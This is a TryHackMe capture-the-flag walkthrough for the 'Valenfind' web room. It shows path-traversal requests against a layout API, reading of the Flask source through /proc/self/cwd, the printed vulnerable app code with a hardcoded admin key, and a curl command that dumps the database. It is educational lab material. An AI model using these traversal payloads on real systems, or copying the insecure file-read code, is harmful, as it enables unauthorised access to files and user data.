# Valenfind Walkthrough

## Intro
Welcome to the Valenfind challenge, here is the link to the [room](https://tryhackme.com/room/lafb2026e10) on TryHackMe.
This is supposed to be a medium level room about web exploitation, part of the Valentine 2026 event.

### Scenario 
There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?

You can access it here: `http://MACHINE_IP:5000`

<br/>

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
Let's go and take a look at the website at `http://10.82.160.233:5000`.
We can click on "Start your Journey" and proceed registering an account on the platform.

Once we have created the account we will be redirected to the dashboard, here we can find multiple profiles and we can either drop a like or view their profile.
If we view the profile of someone we can then send them a valentine invite and choose the invite's theme .

The theme will be fetched via the API like this:
```http
GET /api/fetch_layout?layout=theme_classic.html HTTP/1.1
```

Sending an invite will generate the following request:
```http
POST /like/3 HTTP/1.1
```

Both requests contains an empty body.

Of this 2 requests the first one looks interesting for 2 reasons:
- we have found an API to test
- there is a parameter called `layout` where a file is passed, we can try for common vulns such as LFI 

Let's  capture the request with Burp's proxy and send it to Repeater where we can play with it.

And if we change the parameter value to:
```http
GET /api/fetch_layout?layout=../../../../../../../../etc/hosts HTTP/1.1
```

We can successfully see the content of the file in the response:
```
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
```

If we try to include a non existent file:
```http
GET /api/fetch_layout?layout=../../../../../../../../hello HTTP/1.1
```

We get this error:
```
Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../../../../../../hello'
```

Also with an extension such as  *Wappalyzer* we can see this is a Flask app running with Python.
We can try to include the `app.py` to see more about this app, the file should be located at `/proc/self/cwd/app.py`.

We can find the code:
```python
import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "CUPID_MASTER_KEY_REDACTED"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            cursor = db.cursor()
            
            cursor.execute('''
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    real_name TEXT,
                    email TEXT,
                    phone_number TEXT,
                    address TEXT,
                    bio TEXT,
                    likes INTEGER DEFAULT 0,
                    avatar_image TEXT
                )
            ''')
            
            cursor.executemany('INSERT INTO users (username, password, real_name, email, phone_number, address, bio, likes, avatar_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', INITIAL_USERS)
            db.commit()
            print("Database initialized successfully.")

@app.template_filter('avatar_color')
def avatar_color(username):
    hash_object = hashlib.md5(username.encode())
    return '#' + hash_object.hexdigest()[:6]

# --- ROUTES ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        try:
            cursor = db.cursor()
            cursor.execute('INSERT INTO users (username, password, bio, real_name, email, avatar_image) VALUES (?, ?, ?, ?, ?, ?)', 
                       (username, password, "New to ValenFind!", "", "", "default.jpg"))
            db.commit()
            
            user_id = cursor.lastrowid
            session['user_id'] = user_id
            session['username'] = username
            session['liked'] = []
            
            flash("Account created! Please complete your profile.")
            return redirect(url_for('complete_profile'))
            
        except sqlite3.IntegrityError:
            return render_template('register.html', error="Username already taken.")
    return render_template('register.html')

@app.route('/complete_profile', methods=['GET', 'POST'])
def complete_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db = get_db()
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        
        flash("Profile setup complete! Time to find your match.")
        return redirect(url_for('dashboard'))
        
    return render_template('complete_profile.html')

@app.route('/my_profile', methods=['GET', 'POST'])
def my_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        flash("Profile updated successfully! ✅")
        return redirect(url_for('my_profile'))
    
    user = db.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone()
    return render_template('edit_profile.html', user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        
        if user and user['password'] == password:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['liked'] = [] 
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials.")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    db = get_db()
    profiles = db.execute('SELECT id, username, likes, bio, avatar_image FROM users WHERE id != ?', (session['user_id'],)).fetchall()
    return render_template('dashboard.html', profiles=profiles, user=session['username'])

@app.route('/profile/<username>')
def profile(username):
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    profile_user = db.execute('SELECT id, username, bio, likes, avatar_image FROM users WHERE username = ?', (username,)).fetchone()
    
    if not profile_user:
        return "User not found", 404
        
    return render_template('profile.html', profile=profile_user)

@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    
    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
        return "Security Alert: Database file access is strictly prohibited."
    if 'seeder.py' in layout_file:
        return "Security Alert: Configuration file access is strictly prohibited."
    
    try:
        base_dir = os.path.join(os.getcwd(), 'templates', 'components')
        file_path = os.path.join(base_dir, layout_file)
        
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error loading theme layout: {str(e)}"

@app.route('/like/<int:user_id>', methods=['POST'])
def like_user(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if 'liked' not in session:
        session['liked'] = []
        
    if user_id in session['liked']:
        flash("You already liked this person! Don't be desperate. 😉")
        return redirect(request.referrer)

    db = get_db()
    db.execute('UPDATE users SET likes = likes + 1 WHERE id = ?', (user_id,))
    db.commit()
    
    session['liked'].append(user_id)
    session.modified = True
    
    flash("You sent a like! ❤️")
    return redirect(request.referrer)

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('liked', None)
    return redirect(url_for('index'))

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403

if __name__ == '__main__':
    if not os.path.exists('templates/components'):
        os.makedirs('templates/components')
    
    with open('templates/components/theme_classic.html', 'w') as f:
        f.write('''
```

Even before going trough the code we can see exposed clear-text credentials, the API key `REDACTED` and a db called `cupid.db`.
Another interesting thing is that around the bottom we can find another API endpoint for the Admins to export the database `/api/admin/export_db`, the authentication is done via the header `X-Valentine-Token` and if it matches the API key we have discovered previously it will download the database called `valenfind_leak.db`.

If i had to guess the flag would be in that database, we can try to download it by forging the right request:
```bash
curl -X GET "http://10.82.160.233:5000/api/admin/export_db" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" \
  -H "Accept: */*" \
  -H "Referer: http://10.82.160.233:5000/profile/cleopatra_queen" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Cookie: session=eyJsaWtlZCI6WzEsM10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoidGVzdCJ9.REDACTED" \
  -H "Connection: keep-alive" \
  -H "X-Valentine-Token: REDACTED" \
  --output cupid.db
```

You could also use Burp but in this way i can dump the DB into a file and keep a copy + i am already in the terminal and i like it (lol).

Finally let's find the flag inside it:
```bash
strings cupid.db | grep THM
```

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited the Local File Inclusion vulnerability to find the plain text API token and dumped the database with it to find the flag.

Happy Valentine!

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
